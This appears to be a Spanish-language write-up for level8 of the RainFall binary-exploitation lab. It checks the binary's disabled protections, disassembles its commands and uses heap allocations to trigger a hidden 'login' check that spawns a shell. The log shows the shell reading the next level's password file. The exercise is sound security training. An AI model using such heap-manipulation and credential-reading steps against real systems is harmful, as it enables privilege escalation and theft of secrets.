# 1. Buscar Binario:

Listamos los archivos para que muestre el binario del `level8` y sus permisos:
```bash
level8@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level8 level8   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level8 level8  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level8 level8 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level9 users  6057 Mar  6  2016 level8
-rw-r--r--+ 1 level8 level8   65 Sep 23  2015 .pass
-rw-r--r--  1 level8 level8  675 Apr  3  2012 .profile
```
> **Nota:** El bit `s` en los permisos indica que es un binairo **SUID**. Se ejecuta con los privilegios del propietario (`level9`).

---

# 2. Analizamos las protecciones de la RAM

### a). PIE;
```bash
level8@RainFall:~$ file ./level8 
./level8: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3067a180acabc94d328ab89f0a5a914688bf67ab, not stripped
```

### b). ASLR:
```bash
level8@RainFall:~$ cat /proc/sys/kernel/randomize_va_space 
0
```

### c). NX y RELRO:
```bash
level8@RainFall:~$ readelf -l ./level8 | grep -E "STACK|RELRO"
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
```

### d). STACK CANARY:
```bash
level8@RainFall:~$ nm ./level8 
bash: /usr/bin/nm: Input/output error
```

### e). `.got` y `.plt`:
```bash
level8@RainFall:~$ readelf -S ./level8 | grep -E ".got|.plt"
  [10] .rel.plt          REL             08048374 000374 000050 08   A  5  12  4
  [12] .plt              PROGBITS        08048400 000400 0000b0 04  AX  0   0 16
  [22] .got              PROGBITS        08049a28 000a28 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        08049a2c 000a2c 000034 04  WA  0   0  4
```
---

# 3. Resumen del análisis:

| Protección | Estado | Evidencia | Consecuencias |
| --- | --- | --- | --- |
| **PIE** | **OFF** | `executable` | El binario siempre carga en `0x08048000` |
| **ASLR** | **OFF** | `0` | Las direcciones de librerías y stack son constantes. |
| **NX** | **OFF** | `GNU_STACK RWE` | en este reto **no** estamos usando Shellcode. |
| **RELRO** | **OFF** | `No RELRO ` | La tabla GOT puede ser sobrescrita. |
| **CANARY** | **? ? ?**  | `error` | Buscar con `gdb` |
| **.got.plt** | **WA**  | `WA` | Confirma sección `.got` en escritura |

---

# 4. Fuzzing:

1. Si ejecutamos el binario sin argumentos, con uno o varios argumentos siempre nos muestra dos `(nil), (nil) ` y deja el terminal abierto:
```bash
level8@RainFall:~$ ./level8 
(nil), (nil) 
^C
level8@RainFall:~$ ./level8 test test test test
(nil), (nil) 
^C
level8@RainFall:~$ ./level8 test
(nil), (nil) 

(nil), (nil) 

(nil), (nil) 

(nil), (nil) 
^C
level8@RainFall:~$ 
```

---

# 5. Reverse Engineering (Target Identification):

- Desensamblamos el binario:
```asm
...
0x08048575 <+17>:    mov    ecx,DWORD PTR ds:0x8049ab0              ; Carga variable global 'service'
0x0804857b <+23>:    mov    edx,DWORD PTR ds:0x8049aac              ; Carga variable global 'auth'
0x08048581 <+29>:    mov    eax,0x8048810                           ; Dirección de la string "%p, %p \n"
0x08048591 <+45>:    call   0x8048410 <printf@plt>                  ; Imprime direcciones de service y auth
```

- El programa lee la entrada del usuario mediante `fgets`:
```asm
0x080485a7 <+67>:    lea    eax,[esp+0x20]                          ; stack_buffer en esp+0x20
0x080485ae <+74>:    call   0x8048440 <fgets@plt>                   ; fgets(stack_buffer, 128, stdin)
```

- **Comando "auth "**:
```asm
0x080485c1 <+93>:    mov    eax,0x8048819                           ; "auth "
0x080485cf <+107>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]  ; Compara los primeros 5 bytes
...
0x080485e4 <+128>:   mov    DWORD PTR [esp],0x4                     ; Tamaño 4 bytes
0x080485eb <+135>:   call   0x8048470 <malloc@plt>                  ; auth = malloc(4)
0x080485f0 <+140>:   mov    ds:0x8049aac,eax                        ; Guarda puntero en global auth
...
0x08048625 <+193>:   cmp    eax,0x1e                                ; Comprueba si el argumento > 30 bytes
0x08048628 <+196>:   ja     0x8048642 <main+222>                    ; Si es mayor, salta el strcpy (protección parcial)
0x0804863d <+217>:   call   0x8048460 <strcpy@plt>                  ; strcpy(auth, stack_buffer + 5) ⟸ OVERFLOW
```

- **IMPORTANTE**: Aunque comprueba que no pase de 30 bytes, el `malloc` es solo de **4 bytes**. Aquí tenemos un **Heap Overflow**.

- **Comando "reset"**:
```asm
0x08048648 <+228>:   mov    eax,0x804881f                           ; "reset"
0x08048673 <+271>:   call   0x8048420 <free@plt>                    ; free(auth)
```

- **Comando "service"**:
```asm
0x0804867e <+282>:   mov    eax,0x8048825                           ; "service"
0x080486ab <+327>:   call   0x8048430 <strdup@plt>                  ; service = strdup(stack_buffer + 7)
0x080486b0 <+332>:   mov    ds:0x8049ab0,eax                        ; Guarda en global service
```

- **Comando "login" (Target)**:

```asm
0x080486bb <+343>:   mov    eax,0x804882d                ; "login"
0x080486e2 <+382>:   mov    eax,ds:0x8049aac             ; Carga el puntero auth
0x080486e7 <+387>:   mov    eax,DWORD PTR [eax+0x20]     ; Accede a auth + 32 bytes ⟸ CHECK
0x080486ea <+390>:   test   eax,eax                      ; ¿Es cero?
0x080486ec <+392>:   je     0x80486ff <main+411>         ; Si es cero, falla ("Password:")
```

- **Si el check es OK (distinto de cero)**:

```asm
0x080486ee <+394>:   mov    DWORD PTR [esp],0x8048833    ; Dirección de "/bin/sh"
0x080486f5 <+401>:   call   0x8048480 <system@plt>       ; system("/bin/sh") ⟸ EXPLOIT
```

Para ver con detalle el analisis consulta el archivo  [asm_analysis.md](https://github.com/4trastos/Rainfall/blob/main/level8/Resources/README.md) en conjunto con el programa de demostración  [source.c](https://github.com/4trastos/Rainfall/blob/main/level8/source.c).

---

# 6. Solución: Heap-based Buffer Overflow

El programa comprueba una posición de memoria (`auth + 32`) que está fuera de los 4 bytes reservados originalmente. Al estar en el Heap, si hacemos suficientes reservas con `service` o desbordamos con `auth`, podemos escribir datos en esa posición exacta.

1. **Identificamos el BACKDOOR**

`login` no mira si estás logueado; mira si hay "algo" escrito 32 bytes después de donde empieza `auth`.

2. **Cálculo del Offset :**

* El programa chequea `auth + 32`. Si `auth` está en `0x804a008`, el programa irá a mirar a:
- `0x804a008 + 0x20 (32) = 0x804a028`
* Necesitamos que algo escriba en `0x804a028`.

3. **Construcción del Payload:**

1. **Paso 1**: Usar `auth ` para inicializar el puntero en el heap.
2. **Paso 2**: Usar `service` para realizar nuevas asignaciones. Debido a cómo funciona el binario, el `strdup` de `service` colocará datos en el heap que alcanzarán el offset de 32 bytes respecto a la dirección de `auth`.
3. **Paso 3**: Una vez que el `printf` inicial nos confirme que la dirección de `service` ha alcanzado o superado el `auth + 32`, ejecutamos `login`.
4. **Resultado**: El test en `+387` encontrará datos (el nombre del servicio), no será cero, y nos dará la shell.

### **Ejecución:**
```bash
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018 
service
0x804a008, 0x804a028 
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
$ 
0x804a008, 0x804a028 
level8@RainFall:~$
level8@RainFall:~$ su level9
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level9/level9
level9@RainFall:~$  
```

# ** 7. Conclusión:**

En el **nivel 8** aplicamos una técnica de **Heap Manipulation**. En lugar de sobrescribir una función en la `GOT`, hemos aprovechado la proximidad de las reservas en el Heap.

No estamos desbordando un buffer con una cadena gigante (que también se podría), sino que estamos rellenando el Heap con nuevas reservas (service) hasta que una de ellas cae exactamente en la posición de memoria que el comando `login` chequea por error. Es un exploit mucho más sencillo de elaborar.
